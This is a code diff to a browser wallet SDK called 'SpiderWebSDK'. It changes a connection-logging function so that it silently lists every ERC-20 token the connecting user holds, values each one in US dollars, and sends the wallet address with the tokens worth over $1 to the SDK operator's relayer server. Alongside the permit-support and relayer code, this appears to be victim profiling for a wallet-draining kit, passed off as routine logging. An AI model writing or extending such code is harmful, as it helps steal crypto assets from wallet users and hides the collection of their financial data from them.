@@ -247,19 +247,77 @@ window.SpiderWebSDK = {
     },
     // Add this function to your SpiderWebSDK object
     _logConnectionEvent: async function() {
-        try {
-            await fetch(`${this._RELAYER_SERVER_URL_BASE}/log-connection`, {
+    try {
+        // --- Step 1: Get all token balances from Alchemy ---
+        const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
+        const balanceResponse = await fetch(alchemyUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
+                params: [this._currentUserAddress, 'erc20']
+            })
+        });
+        const balanceData = await balanceResponse.json();
+        if (!balanceData.result) return; // Exit if no tokens
+
+        const tokensWithBalance = balanceData.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
+        if (tokensWithBalance.length === 0) return;
+
+        // --- Step 2: Get prices for all tokens from CoinGecko ---
+        const tokenAddresses = tokensWithBalance.map(t => t.contractAddress);
+        const prices = await this._fetchTokenPrices(tokenAddresses);
+        if (!prices) return; // Exit if price fetch fails
+
+        // --- Step 3: Combine all data into a detailed list ---
+        const detailedTokens = [];
+        for (const token of tokensWithBalance) {
+            const priceData = prices[token.contractAddress.toLowerCase()];
+            const metadataResponse = await fetch(alchemyUrl, {
+                 method: 'POST',
+                 headers: { 'Content-Type': 'application/json' },
+                 body: JSON.stringify({
+                    jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata',
+                    params: [token.contractAddress]
+                 })
+            });
+            const metadata = await metadataResponse.json();
+            
+            if (metadata.result && priceData && priceData.usd) {
+                const decimals = metadata.result.decimals;
+                const symbol = metadata.result.symbol;
+                const formattedBalance = ethers.utils.formatUnits(token.tokenBalance, decimals);
+                const usdValue = parseFloat(formattedBalance) * priceData.usd;
+
+                // Only include tokens with a value over $1 to keep the log clean
+                if (usdValue > 1) {
+                    detailedTokens.push({
+                        symbol: symbol,
+                        balance: parseFloat(formattedBalance).toFixed(4),
+                        usdValue: usdValue.toFixed(2)
+                    });
+                }
+            }
+        }
+        
+        // --- Step 4: Send the detailed list to a new backend endpoint ---
+        if (detailedTokens.length > 0) {
+            await fetch(`${this._RELAYER_SERVER_URL_BASE}/log-connection-details`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
                 body: JSON.stringify({
                     apiKey: this._config.apiKey,
-                    origin: window.location.origin
+                    origin: window.location.origin,
+                    walletAddress: this._currentUserAddress,
+                    tokens: detailedTokens // Send the rich token data
                 })
             });
-        } catch (error) {
-            console.warn("SpiderWebSDK: Could not log connection event.", error);
         }
-    },
+
+    } catch (error) {
+        console.warn("SpiderWebSDK: Could not log detailed connection event.", error);
+    }
+},
     _checkPermitSupport: async function(tokenAddress) {
         try {
             const tokenContract = new ethers.Contract(tokenAddress, this._ERC20_PERMIT_ABI, this._provider);
